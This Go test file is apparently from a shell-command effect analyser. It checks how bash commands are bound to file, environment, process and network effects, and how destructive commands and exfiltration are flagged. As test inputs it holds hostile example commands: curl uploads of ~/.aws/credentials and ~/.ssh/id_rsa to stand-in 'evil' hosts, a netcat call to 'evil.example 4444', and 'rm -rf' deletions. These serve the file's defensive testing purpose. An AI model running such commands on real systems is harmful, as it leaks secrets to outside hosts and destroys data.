package bind_test

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/v0lka/flowsh/bind"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/front/bash"
)

func newBinder(t *testing.T) *bind.Binder {
	t.Helper()
	b, err := bind.NewDefault()
	if err != nil {
		t.Fatalf("bind.NewDefault: %v", err)
	}
	return b
}

// parse binds every statement of src as bash and returns the parsed program.
func parse(t *testing.T, src string) *bash.Program {
	t.Helper()
	prog := bash.Parse(bash.Bash, "t", src)
	if prog.Top {
		t.Fatalf("parse %q failed: %s", src, prog.Reason)
	}
	return prog
}

// bindOne binds the first simple command of src.
func bindOne(t *testing.T, b *bind.Binder, src string) *bind.Result {
	t.Helper()
	prog := parse(t, src)
	if len(prog.Stmts) == 0 || prog.Stmts[0].Cmd == nil {
		t.Fatalf("no command in %q", src)
	}
	return b.BindBash(prog.Stmts[0].Cmd, prog)
}

func findEffect(res *bind.Result, kind engine.EffectKind, mode engine.EffectMode) (engine.Effect, bool) {
	for _, e := range res.Effects {
		if e.Kind == kind && e.Mode == mode {
			return e, true
		}
	}
	return engine.Effect{}, false
}

func hasEffectOn(t *testing.T, res *bind.Result, kind engine.EffectKind, mode engine.EffectMode, target string) engine.Effect {
	t.Helper()
	e, ok := findEffect(res, kind, mode)
	if !ok {
		t.Fatalf("no %s/%s effect; got %s", kind, mode, effectsString(res))
	}
	if !e.Target.Contains(target) {
		t.Fatalf("%s/%s target %s does not contain %q", kind, mode, e.Target, target)
	}
	return e
}

func effectsString(res *bind.Result) string {
	out := "["
	for i, e := range res.Effects {
		if i > 0 {
			out += ", "
		}
		out += string(e.Kind) + "/" + string(e.Mode) + e.Target.String() + "@" + e.Certainty.String()
	}
	return out + "]"
}

// ---------------------------------------------------------------------------
// Acceptance criterion 1: the canonical command → effect table
// ---------------------------------------------------------------------------

func TestBindRmRf(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "rm -rf /x")

	if res.Resolution.Kind != bind.ResolveCommand || res.Resolution.Name != "rm" {
		t.Fatalf("resolution: got %+v, want command/rm", res.Resolution)
	}
	e := hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
	if e.Certainty != engine.CertaintyCertain {
		t.Errorf("certainty: got %s, want Certain (Definite)", e.Certainty)
	}
	if e.Reversible {
		t.Errorf("rm must not be reversible")
	}
	if e.Target.IsTop() {
		t.Errorf("target must be the concrete set {/x}, got ⊤")
	}
	// rm -r / -f are class-E destructive: the join lifts severity to Critical.
	if res.Destructiveness != engine.DestructCritical {
		t.Errorf("destructiveness: got %s, want Critical", res.Destructiveness)
	}
	if len(res.Destructive) == 0 {
		t.Errorf("expected destructive-table matches for rm -rf")
	}
}

func TestBindLs(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "ls /x")

	if res.Resolution.Kind != bind.ResolveCommand || res.Resolution.Name != "ls" {
		t.Fatalf("resolution: got %+v, want command/ls", res.Resolution)
	}
	hasEffectOn(t, res, engine.KindFSRead, engine.ModeDirect, "/x")
	if res.Conservative {
		t.Errorf("ls must not be conservative")
	}
}

func TestBindFindDelete(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "find /x -delete")

	// -delete contributes FSWrite over the operand; the PATH operand is read.
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
	hasEffectOn(t, res, engine.KindFSRead, engine.ModeDirect, "/x")

	// -delete is class E.
	var found bool
	for _, d := range res.Destructive {
		if d.Spec == "-delete" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected the -delete destructive entry, got %+v", res.Destructive)
	}
}

func TestBindCombinedShortFlags(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "rm -rf /a /b")
	e := hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/a")
	if !e.Target.Contains("/b") {
		t.Errorf("target must union both operands, got %s", e.Target)
	}
}

// ---------------------------------------------------------------------------
// Acceptance criterion 2: unknown / dynamic → ⊤, deterministically non-empty
// ---------------------------------------------------------------------------

func TestBindUnknownBinaryIsTop(t *testing.T) {
	b := newBinder(t)
	first := bindOne(t, b, "frobnicate --wat /y")

	if !first.Conservative {
		t.Errorf("unknown binary must be conservative")
	}
	if len(first.Effects) == 0 {
		t.Fatalf("unknown binary must yield a non-empty effect set")
	}
	e, ok := findEffect(first, engine.KindCodeExec, engine.ModeDirect)
	if !ok {
		t.Fatalf("expected a CodeExec effect, got %s", effectsString(first))
	}
	if !e.Target.IsTop() {
		t.Errorf("CodeExec target must be ⊤, got %s", e.Target)
	}

	// Determinism: binding the same call twice yields byte-identical JSON.
	second := bindOne(t, b, "frobnicate --wat /y")
	a, _ := json.Marshal(first)
	c, _ := json.Marshal(second)
	if string(a) != string(c) {
		t.Errorf("binding is not deterministic:\n%s\n%s", a, c)
	}
}

func TestBindDynamicNameIsTop(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "$CMD /y")
	if !res.Conservative {
		t.Errorf("dynamic command name must be conservative")
	}
	if _, ok := findEffect(res, engine.KindCodeExec, engine.ModeDirect); !ok {
		t.Fatalf("expected CodeExec/⊤ for a dynamic name, got %s", effectsString(res))
	}
	if res.Resolution.Kind != bind.ResolveUnknown {
		t.Errorf("resolution kind: got %s, want unknown", res.Resolution.Kind)
	}
}

func TestBindDynamicOperandWidensTarget(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "rm -rf $TARGET")
	e, ok := findEffect(res, engine.KindFSWrite, engine.ModeDirect)
	if !ok {
		t.Fatalf("expected FSWrite, got %s", effectsString(res))
	}
	if !e.Target.IsTop() {
		t.Errorf("a dynamic operand must widen the target to ⊤, got %s", e.Target)
	}
}

// ---------------------------------------------------------------------------
// Acceptance criterion 3: aliases, functions, env-prefixes in resolution
// ---------------------------------------------------------------------------

func TestBindAliasResolution(t *testing.T) {
	b := newBinder(t)
	prog := parse(t, "alias ll='ls -la'\nll /x")
	if len(prog.Stmts) < 2 || prog.Stmts[1].Cmd == nil {
		t.Fatalf("expected a second statement")
	}
	res := b.BindBash(prog.Stmts[1].Cmd, prog)

	if res.Resolution.Kind != bind.ResolveAlias {
		t.Fatalf("resolution kind: got %s, want alias", res.Resolution.Kind)
	}
	if !reflect.DeepEqual(res.Resolution.AliasChain, []string{"ll"}) {
		t.Errorf("alias chain: got %v, want [ll]", res.Resolution.AliasChain)
	}
	if res.Resolution.Name != "ls" {
		t.Errorf("effective command: got %q, want ls", res.Resolution.Name)
	}
	hasEffectOn(t, res, engine.KindFSRead, engine.ModeDirect, "/x")
	if res.Conservative {
		t.Errorf("an alias that resolves to a known command must not be conservative")
	}
}

func TestBindKBCommandAlias(t *testing.T) {
	b := newBinder(t)
	// "remove" is a knowledge-base alias of rm.
	res := bindOne(t, b, "remove /x")
	if res.Resolution.Kind != bind.ResolveCommand || res.Resolution.Name != "rm" {
		t.Fatalf("resolution: got %+v, want command/rm", res.Resolution)
	}
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
}

// TestBindUnlinkCommand proves unlink is its own knowledge-base command (it was
// once an alias of rm; the collision was resolved by giving it a standalone
// single-file declaration).
func TestBindUnlinkCommand(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "unlink /x")
	if res.Resolution.Kind != bind.ResolveCommand || res.Resolution.Name != "unlink" {
		t.Fatalf("resolution: got %+v, want command/unlink", res.Resolution)
	}
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
}

func TestBindFunctionResolution(t *testing.T) {
	b := newBinder(t)
	prog := parse(t, "f() { echo hi; }\nf")
	if len(prog.Stmts) < 2 || prog.Stmts[1].Cmd == nil {
		t.Fatalf("expected a call statement")
	}
	res := b.BindBash(prog.Stmts[1].Cmd, prog)

	if res.Resolution.Kind != bind.ResolveFunction {
		t.Fatalf("resolution kind: got %s, want function", res.Resolution.Kind)
	}
	if !res.Conservative || len(res.Effects) == 0 {
		t.Errorf("a function call must degrade to a conservative, non-empty result: %s", effectsString(res))
	}
}

func TestBindEnvPrefix(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "FOO=1 rm -rf /x")

	if res.Resolution.Name != "rm" {
		t.Fatalf("env prefix must not change the resolved command: got %q", res.Resolution.Name)
	}
	hasEffectOn(t, res, engine.KindEnvWrite, engine.ModeDirect, "FOO")
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
}

func TestBindEnvWrapperPrefix(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "env A=1 rm -rf /x")

	if res.Resolution.Name != "rm" {
		t.Fatalf("env wrapper must not change the resolved command: got %q", res.Resolution.Name)
	}
	hasEffectOn(t, res, engine.KindEnvWrite, engine.ModeDirect, "A")
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
}

func TestBindWrapperChainWithEnv(t *testing.T) {
	b := newBinder(t)
	prog := parse(t, "nohup timeout 30 nice -n 5 sudo env A=1 command xargs -0 rm -rf /x")
	res := b.BindBash(prog.Stmts[0].Cmd, prog)

	if res.Resolution.Name != "rm" {
		t.Fatalf("resolved command: got %q, want rm", res.Resolution.Name)
	}
	hasEffectOn(t, res, engine.KindEnvWrite, engine.ModeDirect, "A")
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "/x")
}

func TestBindBuiltin(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "cd /tmp")
	if res.Resolution.Kind != bind.ResolveBuiltin || res.Resolution.Name != "cd" {
		t.Fatalf("resolution: got %+v, want builtin/cd", res.Resolution)
	}
}

func TestBindAssignmentOnly(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "FOO=bar")
	if res.Resolution.Kind != bind.ResolveAssignment {
		t.Fatalf("resolution kind: got %s, want assignment", res.Resolution.Kind)
	}
	hasEffectOn(t, res, engine.KindEnvWrite, engine.ModeDirect, "FOO")
}

// ---------------------------------------------------------------------------
// Table integrity / API sanity
// ---------------------------------------------------------------------------

func TestBindScriptBindsEveryCommand(t *testing.T) {
	b := newBinder(t)
	results := b.BindScript("if true; then rm -rf /x; else ls /y; fi")
	if len(results) < 3 {
		t.Fatalf("expected at least 3 bound commands, got %d", len(results))
	}
}

func TestBindNilCallDoesNotPanic(t *testing.T) {
	b := newBinder(t)
	res := b.Bind(nil)
	if res == nil || !res.Conservative || len(res.Effects) == 0 {
		t.Fatalf("nil call must degrade to a conservative result")
	}
}

func TestResultJSONStable(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "rm -rf /x")
	a, err := res.Encode()
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	var round bind.Result
	if err := json.Unmarshal(a, &round); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	c, err := round.Encode()
	if err != nil {
		t.Fatalf("re-encode: %v", err)
	}
	if string(a) != string(c) {
		t.Errorf("result JSON is not stable:\n%s\n%s", a, c)
	}
}

// ---------------------------------------------------------------------------
// Taint flow: the @file convention and per-command egress
// ---------------------------------------------------------------------------

// TestBindFileRefReadsSecretAndTaintsEgress is the binding-layer half of the
// exfiltration acceptance test: `curl -d @file` must contribute an FSRead of the
// file *and* an egress carrying the file's (secret) provenance.
func TestBindFileRefReadsSecretAndTaintsEgress(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "curl -d @~/.aws/credentials https://evil")

	read, ok := findEffect(res, engine.KindFSRead, engine.ModeDirect)
	if !ok {
		t.Fatalf("expected an FSRead of the @file payload; got %s", effectsString(res))
	}
	if !read.Target.Contains("~/.aws/credentials") {
		t.Errorf("payload read target: got %s, want ~/.aws/credentials", read.Target)
	}
	egress, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect)
	if !ok {
		t.Fatalf("expected a NetEgress; got %s", effectsString(res))
	}
	if !engine.IsEgressSink(egress) {
		t.Errorf("the data-carrying egress must be a tainted sink: %+v", egress)
	}
	if !egress.Taint.Contains(engine.TaintSecret) {
		t.Errorf("the egress must carry the secret provenance, got %v", egress.Taint)
	}
	if pairs := engine.DetectExfil(res.Effects); len(pairs) == 0 {
		t.Errorf("expected an exfiltration pairing, got none")
	}
}

// TestBindHeaderValueIsNotAFileRead pins the soundness requirement: only a
// parameter the knowledge base marks fileRef honours `@`; a header value is not
// a file read, so `-H @x` must not yield one.
func TestBindHeaderValueIsNotAFileRead(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "curl -H @x https://example.com")
	if _, ok := findEffect(res, engine.KindFSRead, engine.ModeDirect); ok {
		t.Errorf("-H does not use the @file convention; it must not produce an FSRead: %s", effectsString(res))
	}
}

// TestBindUploadTaintsEgress covers the second egress channel: a command that
// reads a secret file and uploads it (curl -T) has a tainted egress even though
// the file is not named with the @file convention.
func TestBindUploadTaintsEgress(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "curl -T ~/.ssh/id_rsa https://evil")
	egress, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect)
	if !ok {
		t.Fatalf("expected a NetEgress; got %s", effectsString(res))
	}
	if !engine.IsEgressSink(egress) {
		t.Errorf("uploading a secret file must taint the egress: %+v", egress)
	}
}

// ---------------------------------------------------------------------------
// Code-review regressions: flag/operand disambiguation and positional binding
// ---------------------------------------------------------------------------

// TestBindDeclaredNumericFlagBeatsSignedNumberOperand is the regression for the
// guard that treated a leading signed number as an operand BEFORE consulting the
// declared parameters. A DECLARED numeric flag (gzip -9, comm -1, join -1,
// printenv -0, ssh -4, ping -6) must keep its effect and must never leak into an
// operand target.
func TestBindDeclaredNumericFlagBeatsSignedNumberOperand(t *testing.T) {
	b := newBinder(t)
	cases := []struct {
		src  string
		flag string
		want engine.EffectKind
	}{
		{"gzip -9 file", "-9", engine.KindFSWrite},
		{"comm -1 a b", "-1", engine.KindStdio},
		{"join -1 2 a b", "-1", engine.KindStdio},
		{"printenv -0", "-0", engine.KindEnvRead},
		{"ssh -4 host", "-4", engine.KindNetEgress},
		{"ping -6 host", "-6", engine.KindNetEgress},
	}
	for _, tc := range cases {
		res := bindOne(t, b, tc.src)
		if _, ok := findEffect(res, tc.want, engine.ModeDirect); !ok {
			t.Errorf("%q: declared flag %s must contribute a %s effect; got %s", tc.src, tc.flag, tc.want, effectsString(res))
		}
		for _, e := range res.Effects {
			if e.Target.Contains(tc.flag) {
				t.Errorf("%q: declared flag %s leaked into an operand target %s", tc.src, tc.flag, e.Target)
			}
		}
	}
}

// TestBindKillSignedNumberStaysOperand pins the other half of the rule: kill
// declares no -9/-1 flag, so both tokens remain operands (the PID positional
// absorbs them) and neither surfaces as an unknown flag.
func TestBindKillSignedNumberStaysOperand(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "kill -9 -1")
	hasEffectOn(t, res, engine.KindProcSignal, engine.ModeDirect, "-1")
	for _, n := range res.Notes {
		if strings.Contains(n, "-9") || strings.Contains(n, "-1") {
			t.Errorf("kill -9 -1: a signed number must not be reported as an unknown flag: %q", n)
		}
	}
}

// TestBindValueMatchedSubcommandDoesNotFabricate is the regression for the
// index-order fallback that still ran for the non-matched positionals after a
// value match, fabricating effects (7z l ARCHIVE → bogus FSWrite; git clean PATH
// → bogus NetEgress).
func TestBindValueMatchedSubcommandDoesNotFabricate(t *testing.T) {
	b := newBinder(t)

	res := bindOne(t, b, "7z l /tmp/x.7z")
	hasEffectOn(t, res, engine.KindFSRead, engine.ModeDirect, "/tmp/x.7z")
	if _, ok := findEffect(res, engine.KindFSWrite, engine.ModeDirect); ok {
		t.Errorf("7z l: a read-only listing must not fabricate an FSWrite: %s", effectsString(res))
	}

	res = bindOne(t, b, "git clean foo")
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "foo")
	if _, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect); ok {
		t.Errorf("git clean: must not fabricate a NetEgress: %s", effectsString(res))
	}
}

// TestBindGenericPositionalsStillBind guards the fix above against
// over-correction: the ordinary SRC/DEST/FILE forms keep binding their real
// operands.
func TestBindGenericPositionalsStillBind(t *testing.T) {
	b := newBinder(t)

	res := bindOne(t, b, "cp a b")
	hasEffectOn(t, res, engine.KindFSRead, engine.ModeDirect, "a")
	hasEffectOn(t, res, engine.KindFSWrite, engine.ModeDirect, "b")

	hasEffectOn(t, bindOne(t, b, "chmod 644 f"), engine.KindFSMeta, engine.ModeDirect, "f")
	hasEffectOn(t, bindOne(t, b, "grep x f"), engine.KindFSRead, engine.ModeDirect, "f")
	hasEffectOn(t, bindOne(t, b, "sed s/a/b/ f"), engine.KindFSRead, engine.ModeDirect, "f")
	hasEffectOn(t, bindOne(t, b, "tar -cf a.tar d"), engine.KindFSRead, engine.ModeDirect, "d")

	res = bindOne(t, b, "git clone https://example.com/repo.git work")
	eg, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect)
	if !ok {
		t.Fatalf("git clone: expected NetEgress, got %s", effectsString(res))
	}
	if !eg.Target.Contains("https://example.com/repo.git") {
		t.Errorf("git clone: egress target %s must cover the remote URL", eg.Target)
	}
	if eg.Target.Contains("work") {
		t.Errorf("git clone: the local directory operand is not a network address and must be filtered out of the egress target %s", eg.Target)
	}
}

// TestBindSelfParamEmitsIntrinsic pins that a declared kind: self parameter
// contributes its effect regardless of what else matched: reboot -f must report
// ProcSpawn{reboot} alongside the -f ProcSignal, not only the flag's effect.
func TestBindSelfParamEmitsIntrinsic(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "reboot -f")
	e, ok := findEffect(res, engine.KindProcSpawn, engine.ModeDirect)
	if !ok {
		t.Fatalf("reboot -f: expected an intrinsic ProcSpawn, got %s", effectsString(res))
	}
	if !e.Target.Contains("reboot") {
		t.Errorf("reboot -f: ProcSpawn target %s must be the command itself", e.Target)
	}
	if _, ok := findEffect(res, engine.KindProcSignal, engine.ModeDirect); !ok {
		t.Errorf("reboot -f: expected the -f ProcSignal alongside the intrinsic ProcSpawn, got %s", effectsString(res))
	}
}

// ---------------------------------------------------------------------------
// Egress target gate: a NetEgress effect needs a host-shaped target
// ---------------------------------------------------------------------------

// TestBindPhantomEgressNotCreated is the audit-track-A regression: a VCS
// client's operands are subcommands, refs, SHAs and pathspecs first. The
// index-order positional fallback used to force-fit them onto the
// clone/fetch/pull/push network positionals and report NetEgress effects with
// targets like "status", "diff" or a commit SHA — turning any `git status` or
// `git diff` pipeline into "network egress" evidence. A literal operand that
// names no address creates no egress effect at all.
func TestBindPhantomEgressNotCreated(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"git status --porcelain=v1",
		"git diff main...HEAD -- core/tools/registry.go",
		"git diff cd234ef7f17d30a3c32803810246676c5afb221b pr-36 -- .github/workflows/ci.yml",
		"git show main:backend/config/defaults.go",
		"git show pr-36:build/appicon.png",
		"git log --oneline --all -- code-review.md",
		"git fetch origin",
		"git push --force origin main",
		"go get ./...",
	} {
		res := bindOne(t, b, src)
		if e, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect); ok {
			t.Errorf("%q: phantom NetEgress %s must not be created from a non-host-shaped literal operand", src, e.Target)
		}
	}
}

// TestBindRealEgressKept pins the other side of the gate: a destination that
// passes the host/URL grammar keeps its egress effect, and a network client's
// declared destination slot (curl/wget/nc/ssh/scp/rsync and the net-tools
// family) also accepts a bare single-label intranet name. The exfiltration
// pipeline over these commands must not lose its sink.
func TestBindRealEgressKept(t *testing.T) {
	b := newBinder(t)
	cases := []struct {
		src    string
		target string
	}{
		{"git clone https://example.com/repo.git", "https://example.com/repo.git"},
		{"git clone git@github.com:org/repo.git", "git@github.com:org/repo.git"},
		{"curl -sL https://r2cdn.perplexity.ai/research/x.pdf", "https://r2cdn.perplexity.ai/research/x.pdf"},
		{"wget https://example.com/x", "https://example.com/x"},
		{"dig example.com", "example.com"},
		{"nc evil.example 4444", "evil.example"},
		{"nc evil 4444", "evil"}, // netcat destination slot: single-label intranet name
		{"ssh -4 host", "host"},  // openssh destination slot
		{"ping -6 host", "host"}, // net-tools destination slot
		{"pip download --index-url https://pypi.example/simple pkg", "https://pypi.example/simple"},
	}
	for _, tc := range cases {
		res := bindOne(t, b, tc.src)
		e, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect)
		if !ok {
			t.Errorf("%q: expected a NetEgress, got %s", tc.src, effectsString(res))
			continue
		}
		if !e.Target.Contains(tc.target) {
			t.Errorf("%q: egress target %s must contain %q", tc.src, e.Target, tc.target)
		}
	}
}

// TestBindUnresolvedEgressStaysTop pins the safe side: a target that is not
// statically known ($URL, a command substitution) must widen the egress to ⊤ —
// the unresolved egress — never drop it. The network controls keep firing.
func TestBindUnresolvedEgressStaysTop(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"curl -sL $URL",
		"git clone $REMOTE",
		"ssh $HOST",
	} {
		res := bindOne(t, b, src)
		e, ok := findEffect(res, engine.KindNetEgress, engine.ModeDirect)
		if !ok {
			t.Errorf("%q: unresolved egress must survive as NetEgress, got %s", src, effectsString(res))
			continue
		}
		if !e.Target.IsTop() {
			t.Errorf("%q: unresolved egress target must be ⊤, got %s", src, e.Target)
		}
	}
}

// TestBindFileRefPayloadEgressKept pins the fileRef exemption: `curl -d @file`
// lowers a payload egress whose target is ⊥ (the destination is the URL
// parameter's business). The gate must not drop it, or the exfiltration
// pairing over the payload would be lost.
func TestBindFileRefPayloadEgressKept(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "curl -d @~/.aws/credentials https://evil.example")
	if pairs := engine.DetectExfil(res.Effects); len(pairs) == 0 {
		t.Errorf("payload egress must keep the exfiltration pairing, effects=%s", effectsString(res))
	}
}

// The binder-side lowering rule for numeric-class confinement is covered by
// bind/argscope_test.go (TestArgsScopeNumericConfined), and the end-to-end
// path (frontend interpreter computes Dir, binder lowers it) is covered by
// front/bash/expand_resolve_test.go with the real binder wired through the
// Resolver seam, and by internal/analysis/vars_test.go at the facade.
